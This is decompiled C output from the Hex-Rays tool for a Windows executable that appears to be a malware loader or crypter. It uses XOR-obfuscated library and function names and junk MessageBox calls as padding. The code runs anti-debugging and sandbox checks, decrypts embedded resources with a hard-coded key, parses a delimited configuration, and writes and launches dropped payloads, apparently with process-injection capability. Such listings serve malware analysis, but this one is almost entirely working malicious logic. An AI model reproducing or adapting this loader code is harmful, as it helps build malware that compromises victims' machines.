/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_401000();
int sub_40100A();
void __noreturn sub_40101F(); // weak
// int __userpurge sub_40102C@<eax>(int@<ebx>, int, int, int, int);
// int __usercall sub_401DC3@<eax>(int@<ebx>, int, _WORD *);
void __cdecl sub_40204B(HANDLE hProcess);
// char *__usercall sub_402237@<eax>(int@<ebx>, int, _DWORD *);
_BYTE *__cdecl sub_40241B(int);
const CHAR *sub_40253C();
int sub_40268C();
LPSTR __cdecl sub_402854(char *);
int sub_402B4E();
BOOL sub_402C4E();
_BYTE *__cdecl sub_402D20(int, _BYTE *, int);
int sub_402DFF();
BOOL sub_402EEC();
BOOL sub_402F45();
BOOL sub_403053();
int sub_4030BF();
int __cdecl sub_403131(int, int, unsigned int, unsigned int);
int sub_403335();
int __cdecl sub_4036EB(int, int);
// int __usercall StartAddress@<eax>(int@<ebx>);
int __cdecl sub_403CA4(int);
// _BYTE *__usercall sub_403DB0@<eax>(int@<ebx>, int, SIZE_T dwBytes, int);
BOOL __cdecl sub_403E62(LPVOID lpMem);
char *__cdecl sub_403E7C(char *, const char *);
CHAR *__cdecl sub_403E9E(LPCSTR lpName);
int __cdecl sub_403EC7(char *, _BYTE *);
_BYTE *__cdecl sub_403EE9(int, _BYTE *);
char *__cdecl sub_403F60(char *, const char *);
LPVOID __cdecl sub_403F75(SIZE_T dwBytes);
// char *__usercall sub_403F8E@<eax>(int@<ebx>, char *, char, unsigned int);
_BYTE *__cdecl sub_403FC1(_BYTE *, int, int);
unsigned int __cdecl sub_403FE3(char *a1);
int __cdecl sub_403FF4(int);
int sub_404003();
// void __usercall __noreturn start(int@<ebx>);
BOOL sub_4040FD();
unsigned int __cdecl sub_404112(char *a1, char **a2, unsigned int a3);
void __cdecl __noreturn sub_4041E5(UINT uExitCode); // idb
int __cdecl sub_40421A(int (**)(void), unsigned int, int);
int sub_404241();

//-------------------------------------------------------------------------
// Data declarations

// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetLastError)();
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *IsDebuggerPresent)();
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern int (__stdcall *MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
const CHAR String[] = "lVCaJSHs"; // idb
_UNKNOWN unk_4050EC; // weak
int (*off_406000[2])(void) = { NULL, &sub_401000 }; // weak
_UNKNOWN unk_406008; // weak
int (*off_40600C[2])(void) = { NULL, &sub_4040FD }; // weak
_UNKNOWN unk_406014; // weak
int (*dword_406018)(void) = NULL; // weak
_UNKNOWN unk_40601C; // weak
int (*dword_406020)(void) = NULL; // weak
_UNKNOWN unk_406024; // weak
CHAR byte_406030 = '\x02'; // idb
CHAR LibFileName[3] = "\a31"; // idb
CHAR a25[4] = "\r25"; // idb
CHAR a6A[] = "\x1B?-\b$6<]\b:/a/$&"; // idb
CHAR asc_406078[3] = "/:,"; // idb
CHAR asc_406084[4] = "/$&"; // idb
CHAR asc_406090[3] = ";$*"; // idb
CHAR asc_40609C[2] = "\"\""; // idb
CHAR asc_4060B4[2] = "\"\""; // idb
CHAR asc_4060CC[2] = "\"\""; // idb
CHAR asc_4060E0[2] = "\"\""; // idb
CHAR asc_4060F4[2] = "\"\""; // idb
CHAR asc_406104[2] = "\"\""; // idb
CHAR a1[3] = ":?1"; // idb
CHAR asc_406130[3] = "*?-"; // idb
CHAR a9[3] = "??9"; // idb
CHAR a9_0[3] = " 9\""; // idb
CHAR a9_1[4] = " 9 \n"; // idb
_UNKNOWN unk_406170; // weak
_UNKNOWN unk_4061B4; // weak
CHAR ModuleName[15] = "\b4$\t/?8]\b:/a?4*"; // idb
CHAR aA12[19] = "\r&*>&</]\b:/a\b?1>=2<"; // idb
CHAR byte_4061F4 = '\x1C'; // idb
CHAR a87[3] = "%87"; // idb
CHAR a87_0[3] = "%87"; // idb
CHAR a87_1[3] = "%87"; // idb
CHAR a87_2[3] = "%87"; // idb
CHAR byte_40624C = '\x19'; // idb
CHAR byte_406258 = '\x1F'; // idb
CHAR ProcName[10] = ">3$.:6&8\t/"; // idb
CHAR a3067[11] = ">3$0?6:\n:7/"; // idb
CHAR a386[9] = ">3$\"86)\a\t"; // idb
CHAR a32[6] = ">3$2/'"; // idb
CHAR a3[7] = ">3$\"&<;"; // idb
CHAR asc_4062B4[5] = "?>&\r&"; // idb
CHAR a30[3] = "!30"; // idb
_UNKNOWN unk_4062D0; // weak
_UNKNOWN unk_4062E8; // weak
const char asc_406318[] = "?"; // idb
CHAR aA[4] = "\x1B?-a"; // idb
CHAR byte_406354[4] = { '\x1F', '/', '0', 'a' }; // weak
CHAR a3a[4] = "\r&3a"; // idb
CHAR byte_40635C[4] = { '\x01', '3', 'C', '\0' }; // weak
CHAR String2[4] = "\b4C"; // idb
CHAR a0[3] = "?/0"; // idb
const char a0_0[] = "0%:"; // idb
CHAR a3S[8] = "-&3%+')s"; // idb
CHAR a8[2] = "8\x1B"; // idb
_UNKNOWN unk_406388; // weak
_UNKNOWN unk_406390; // weak
CHAR a95[3] = "!95"; // idb
CHAR a93[3] = "/93"; // idb
CHAR a372[8] = "?37'#?-2"; // idb
_UNKNOWN unk_4063C8; // weak
_UNKNOWN unk_4063DC; // weak
_UNKNOWN unk_406418; // weak
CHAR asc_406424[3] = "-:/"; // idb
CHAR asc_406440[3] = "/>&"; // idb
CHAR asc_406458[3] = "*$&"; // idb
char byte_406460[20] =
{
  '\\',
  'g',
  'q',
  'R',
  '~',
  'f',
  '~',
  'D',
  'T',
  'o',
  '\"',
  '\x03',
  ')',
  '7',
  '-',
  '\x15',
  'l',
  '\0',
  '\0',
  '\0'
}; // weak
int dword_406474 = 1; // weak
_BYTE byte_406478[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40647C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_406480[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_406484[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_406488[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40648C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_406490[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_406494[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_406498[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40649C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064A0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064A4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064A8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064AC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064B0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064B4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064B8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064BC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064C0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064C4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064C8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064CC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064D0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064D4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064D8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064DC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4064E0[4] = { 124, 124, 0, 0 }; // weak
CHAR asc_4064E4[2] = "\\"; // idb
char asc_4064E8[2] = "\\"; // weak
char asc_4064EC[2] = "-"; // weak
char asc_4064F0[2] = "."; // weak
char asc_4064F4[2] = "\""; // weak
char asc_4064F8[2] = "\""; // weak
char asc_4064FC[3] = "%%"; // weak
char asc_406500[3] = "%%"; // weak
char asc_406504[3] = "%%"; // weak
char asc_406508[3] = "%%"; // weak
char asc_40650C[2] = "\\"; // weak
CHAR asc_406510[2] = "\\"; // idb
CHAR asc_406514[2] = "\\"; // idb
int dword_406518 = 1; // weak
int dword_406520 = 0; // weak
LPSTR dword_406524 = NULL; // idb
CHAR String1 = '\0'; // idb
char byte_406551 = '\0'; // weak
CHAR byte_406578[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_4065A1 = '\0'; // idb
CHAR byte_4065A3[4] = { '\0', '\0', '\0', '\0' }; // idb
char byte_4065A7 = '\0'; // weak
CHAR Name[17] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
char byte_4065BA[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_4065E3[261] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // weak
char byte_4066E8[6]; // weak
char byte_4066EE; // weak
char byte_406815; // weak
char byte_406817; // weak
char byte_406819[2]; // weak
CHAR byte_40681B[6]; // idb
char byte_406821[9]; // weak
CHAR byte_40682A[6]; // idb
char byte_406830[6]; // weak
CHAR byte_406836[41]; // idb
char byte_40685F[]; // weak
char byte_406861[]; // weak
CHAR byte_406863[41]; // weak
char byte_40688C[]; // weak
_UNKNOWN unk_406904; // weak
_UNKNOWN unk_40692D; // weak
char byte_406A32[1698]; // weak
CHAR byte_4070D4[8]; // idb
LPSTR lpString1; // idb
LPSTR lpString2; // idb
int dword_4070E4; // weak
int dword_4070E8; // weak
HMODULE dword_4070EC; // idb
HMODULE hModule; // idb
HMODULE dword_4070F4; // idb
HMODULE dword_4070F8; // idb
HMODULE dword_4070FC; // idb
HMODULE dword_407100; // idb
int (__stdcall *dword_407104)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407108)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40710C)(_DWORD); // weak
int (__stdcall *dword_407110)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407114)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407118)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *__)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407120)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407124)(_DWORD); // weak
int (__stdcall *dword_407128)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40712C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
CHAR Buffer[1024]; // idb
int dword_407530; // weak
int dword_407534; // weak
int dword_407540[32]; // weak
HANDLE hHeap; // idb
int (*dword_4075C4)(void); // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  return sub_40100A();
}

//----- (0040100A) --------------------------------------------------------
int sub_40100A()
{
  int result; // eax

  result = lstrlenA("lVCaJSHs");
  dword_406520 = result;
  return result;
}
// 406520: using guessed type int dword_406520;

//----- (0040101F) --------------------------------------------------------
void __noreturn sub_40101F()
{
  ExitProcess(0);
}
// 40101F: using guessed type void __noreturn sub_40101F();

//----- (0040102C) --------------------------------------------------------
int __userpurge sub_40102C@<eax>(int a1@<ebx>, int a2, int a3, int a4, int a5)
{
  const CHAR *v6; // eax
  const char *v7; // eax
  const char *v8; // eax
  const CHAR *v9; // eax
  const char *v10; // eax
  const char *v11; // eax
  const char *v12; // eax
  const char *v13; // eax
  const char *v14; // eax
  const char *v15; // eax
  const char *v16; // eax
  const char *v17; // eax
  const char *v18; // eax
  const CHAR *v19; // eax
  const char *v20; // eax
  const CHAR *v21; // eax
  const char *v22; // eax
  const char *v23; // eax
  const CHAR *v24; // eax
  const CHAR *v25; // eax
  const char *v26; // eax
  const CHAR *v27; // eax
  const CHAR *v28; // eax
  CHAR *v29; // eax
  CHAR *v30; // eax
  int v31; // [esp+2Ch] [ebp-78h]
  char *lpString1; // [esp+34h] [ebp-70h]
  CHAR *v33; // [esp+38h] [ebp-6Ch]
  char *v34; // [esp+3Ch] [ebp-68h]
  char *v35; // [esp+40h] [ebp-64h]
  _WORD *v36; // [esp+40h] [ebp-64h]
  const CHAR *lpString2; // [esp+44h] [ebp-60h]
  const CHAR *lpString2a; // [esp+44h] [ebp-60h]
  const CHAR *lpString2b; // [esp+44h] [ebp-60h]
  const char *lpString2c; // [esp+44h] [ebp-60h]
  const char *lpString2d; // [esp+44h] [ebp-60h]
  const CHAR *lpString2e; // [esp+44h] [ebp-60h]
  char *v43; // [esp+4Ch] [ebp-58h]
  char *v44; // [esp+58h] [ebp-4Ch]
  int v45; // [esp+58h] [ebp-4Ch]
  unsigned int v46; // [esp+64h] [ebp-40h] BYREF
  HANDLE hHandle; // [esp+68h] [ebp-3Ch]
  int v48; // [esp+6Ch] [ebp-38h]
  int i; // [esp+70h] [ebp-34h]
  int v50; // [esp+74h] [ebp-30h]
  __int16 v51; // [esp+78h] [ebp-2Ch]
  int v52; // [esp+7Ch] [ebp-28h]
  unsigned int v53[7]; // [esp+80h] [ebp-24h] BYREF
  int v54[2]; // [esp+9Ch] [ebp-8h] BYREF

  v53[4] = 2108;
  i = 0;
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  sub_4030BF();
  ::lpString1 = (LPSTR)sub_403F75(0x105u);
  ::lpString2 = (LPSTR)sub_403F75(0x105u);
  dword_406524 = (LPSTR)sub_403F75(0x105u);
  sub_403335();
  v50 = 1685;
  v53[1] = 1641;
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  dword_4070EC = LoadLibraryA(LibFileName);
  hModule = LoadLibraryA(a25);
  dword_4070F4 = LoadLibraryA(&byte_406030);
  dword_4070F8 = LoadLibraryA(a6A);
  v48 = 2681;
  dword_4070FC = LoadLibraryA(&byte_40624C);
  v51 = 2694;
  dword_407100 = LoadLibraryA(&byte_406258);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  dword_407104 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, ProcName);
  dword_407108 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, a3067);
  dword_40710C = (int (__stdcall *)(_DWORD))GetProcAddress(hModule, ::a3);
  dword_407110 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(hModule, a386);
  dword_407114 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, a32);
  dword_407118 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      dword_407100,
                                                                                      asc_4062B4);
  v53[6] = 1150;
  __ = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                    dword_4070EC,
                                                                                    asc_406084);
  dword_407120 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_4070EC, asc_406090);
  v53[5] = 2679;
  dword_407124 = (int (__stdcall *)(_DWORD))GetProcAddress(dword_4070EC, asc_406078);
  dword_40712C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_4070EC, ::a1);
  dword_407128 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_4070F4, asc_406104);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  dword_4070E8 = sub_402B4E();
  dword_406474 = sub_402C4E();
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  v53[3] = (unsigned int)v54;
  v54[1] = (int)sub_40101F;
  v54[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  if ( sub_403053() )
    return 0;
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  GetModuleFileNameA(0, ::lpString2, 0x104u);
  v52 = 4046;
  v6 = sub_40241B(0);
  lstrcpyA(::lpString1, v6);
  if ( !::lpString1 )
    sub_403F60(::lpString1, ::lpString2);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  v53[0] = 0;
  v46 = 0;
  v44 = sub_402237(a1, (int)&unk_406390, v53);
  if ( !v44 || !v53[0] )
  {
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    return 0;
  }
  v45 = sub_403131((int)v44, (int)"lVCaJSHs", v53[0], dword_406520);
  if ( !v45 || !v53[0] )
    return 0;
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  lpString2 = sub_403EE9(v45, byte_406478);
  if ( !lpString2 )
    return 0;
  lstrcpyA(&String1, lpString2);
  v7 = sub_403EE9(0, byte_40647C);
  sub_403F60(&byte_406551, v7);
  v8 = sub_403EE9(0, byte_406480);
  sub_403F60(byte_406578, v8);
  v9 = sub_403EE9(0, byte_406484);
  lstrcpyA(&byte_4065A1, v9);
  v10 = sub_403EE9(0, byte_406488);
  sub_403F60(byte_4065A3, v10);
  v11 = sub_403EE9(0, byte_40648C);
  sub_403F60(&byte_4065A7, v11);
  v12 = sub_403EE9(0, byte_406490);
  sub_403F60(byte_4065BA, v12);
  v13 = sub_403EE9(0, byte_406494);
  sub_403F60(byte_4065E3, v13);
  v14 = sub_403EE9(0, byte_406498);
  sub_403F60(byte_4066E8, v14);
  v15 = sub_403EE9(0, byte_40649C);
  sub_403F60(&byte_4066EE, v15);
  v16 = sub_403EE9(0, byte_4064A0);
  sub_403F60(&byte_406815, v16);
  v17 = sub_403EE9(0, byte_4064A4);
  sub_403F60(&byte_406817, v17);
  v18 = sub_403EE9(0, byte_4064A8);
  sub_403F60(byte_406819, v18);
  v19 = sub_403EE9(0, byte_4064AC);
  lstrcpyA(byte_40681B, v19);
  v20 = sub_403EE9(0, byte_4064B0);
  sub_403F60(byte_406821, v20);
  v21 = sub_403EE9(0, byte_4064B4);
  lstrcpyA(byte_40682A, v21);
  v22 = sub_403EE9(0, byte_4064B8);
  sub_403F60(byte_406830, v22);
  v23 = sub_403EE9(0, byte_4064BC);
  sub_403F60(byte_406836, v23);
  v24 = sub_403EE9(0, byte_4064C0);
  lstrcpyA(Name, v24);
  lpString2a = sub_403EE9(0, byte_4064C4);
  lstrcpyA(byte_4070D4, lpString2a);
  v53[2] = 1276;
  for ( i = 0; i < 5; ++i )
  {
    lpString2b = sub_403EE9(0, byte_4064C8);
    lstrcpyA(&byte_40685F[9 * i], lpString2b);
    if ( byte_40685F[9 * i] != 48 )
    {
      v25 = sub_403EE9(0, byte_4064CC);
      lstrcpyA(&byte_406861[9 * i], v25);
      lpString2c = sub_403EE9(0, byte_4064D0);
      sub_403F60(&byte_406863[9 * i], lpString2c);
    }
  }
  for ( i = 0; i < 5; ++i )
  {
    lpString2d = sub_403EE9(0, byte_4064D4);
    sub_403F60(&byte_40688C[424 * i], lpString2d);
    if ( byte_40688C[424 * i] != 48 )
    {
      v26 = sub_403EE9(0, byte_4064D8);
      sub_403F60((char *)&unk_406904 + 424 * i, v26);
      v27 = sub_403EE9(0, byte_4064DC);
      lstrcpyA((LPSTR)&unk_40692D + 424 * i, v27);
      lpString2e = sub_403EE9(0, byte_4064E0);
      lstrcpyA(&byte_406A32[424 * i], lpString2e);
    }
  }
  CreateMutexA(0, 1, Name);
  if ( GetLastError() == 183 )
  {
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    return 0;
  }
  if ( byte_406815 == 49 )
  {
    if ( sub_402DFF() || sub_402F45() )
      return 0;
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  }
  if ( byte_406817 == 49 )
  {
    if ( sub_402EEC() )
      return 0;
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  }
  v28 = sub_402854(::lpString2);
  lstrcpyA(::lpString2, v28);
  if ( dword_4070E4 )
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  else
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  lpString1 = (char *)sub_403F75(0x105u);
  if ( !dword_4070E8 || dword_406474 )
  {
    sub_403F60(lpString1, ::lpString2);
  }
  else if ( sub_403EC7(byte_406836, byte_40635C) )
  {
    if ( lstrcmpA(byte_406836, String2) )
    {
      v29 = sub_403E9E(a0);
      lstrcpyA(lpString1, v29);
      lstrcatA(lpString1, asc_4064E4);
      lstrcatA(lpString1, byte_406836);
    }
    else
    {
      sub_403F60(lpString1, ::lpString1);
    }
  }
  else
  {
    lstrcpyA(lpString1, ::lpString2);
  }
  hHandle = 0;
  if ( byte_40688C[0] != 48 && ::lpString1 )
    hHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  v43 = (char *)sub_403F75(0x105u);
  v34 = (char *)sub_403F75(0x105u);
  for ( i = 0; i <= 5; ++i )
  {
    sub_403F60(v43, byte_406821);
    v33 = (CHAR *)sub_403F75(0xAu);
    sub_402D20(i, v33, 10);
    lstrcatA(v43, v33);
    if ( !i || byte_406861[9 * i - 9] == 50 || byte_406861[9 * i - 9] == 49 && dword_4070E4 )
    {
      v35 = sub_402237(a1, (int)v43, &v46);
      if ( !v35 )
        break;
      if ( !v46 )
        break;
      v36 = (_WORD *)sub_403131((int)v35, (int)"lVCaJSHs", v46, dword_406520);
      if ( !v36 || !v46 )
        break;
      if ( i && byte_40685F[9 * i - 9] == 50 )
      {
        v30 = sub_403E9E(a8);
        sub_403F60(v34, v30);
        sub_403E7C(v34, asc_4064E8);
        sub_403E7C(v34, v33);
        sub_403E7C(v34, asc_4064EC);
        lstrcatA(v34, Name);
        sub_403E7C(v34, asc_4064F0);
        lstrcatA(v34, &byte_406863[9 * i - 9]);
        MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
        MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
        v31 = __(v34, 0x40000000, 0, 0, 2, 0, 0);
        if ( v31 == -1 )
          break;
        dword_407120(v31, v36, v46, &v46, 0);
        dword_407124(v31);
        dword_407118(0, &unk_406388, v34, 0, 0, 1);
      }
      else
      {
        if ( !sub_401DC3(a1, (int)lpString1, v36) )
          goto LABEL_70;
        MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
      }
    }
    else
    {
      MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    }
    v46 = 0;
    sub_403E62(v33);
  }
  if ( hHandle )
  {
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  }
LABEL_70:
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  return 0;
}
// 40101F: using guessed type void __noreturn sub_40101F();
// 406474: using guessed type int dword_406474;
// 406478: using guessed type _BYTE byte_406478[4];
// 40647C: using guessed type _BYTE byte_40647C[4];
// 406480: using guessed type _BYTE byte_406480[4];
// 406484: using guessed type _BYTE byte_406484[4];
// 406488: using guessed type _BYTE byte_406488[4];
// 40648C: using guessed type _BYTE byte_40648C[4];
// 406490: using guessed type _BYTE byte_406490[4];
// 406494: using guessed type _BYTE byte_406494[4];
// 406498: using guessed type _BYTE byte_406498[4];
// 40649C: using guessed type _BYTE byte_40649C[4];
// 4064A0: using guessed type _BYTE byte_4064A0[4];
// 4064A4: using guessed type _BYTE byte_4064A4[4];
// 4064A8: using guessed type _BYTE byte_4064A8[4];
// 4064AC: using guessed type _BYTE byte_4064AC[4];
// 4064B0: using guessed type _BYTE byte_4064B0[4];
// 4064B4: using guessed type _BYTE byte_4064B4[4];
// 4064B8: using guessed type _BYTE byte_4064B8[4];
// 4064BC: using guessed type _BYTE byte_4064BC[4];
// 4064C0: using guessed type _BYTE byte_4064C0[4];
// 4064C4: using guessed type _BYTE byte_4064C4[4];
// 4064C8: using guessed type _BYTE byte_4064C8[4];
// 4064CC: using guessed type _BYTE byte_4064CC[4];
// 4064D0: using guessed type _BYTE byte_4064D0[4];
// 4064D4: using guessed type _BYTE byte_4064D4[4];
// 4064D8: using guessed type _BYTE byte_4064D8[4];
// 4064DC: using guessed type _BYTE byte_4064DC[4];
// 4064E0: using guessed type _BYTE byte_4064E0[4];
// 406520: using guessed type int dword_406520;
// 406551: using guessed type char byte_406551;
// 4065A7: using guessed type char byte_4065A7;
// 4066EE: using guessed type char byte_4066EE;
// 406815: using guessed type char byte_406815;
// 406817: using guessed type char byte_406817;
// 4070E4: using guessed type int dword_4070E4;
// 4070E8: using guessed type int dword_4070E8;
// 407104: using guessed type int (__stdcall *dword_407104)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407108: using guessed type int (__stdcall *dword_407108)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
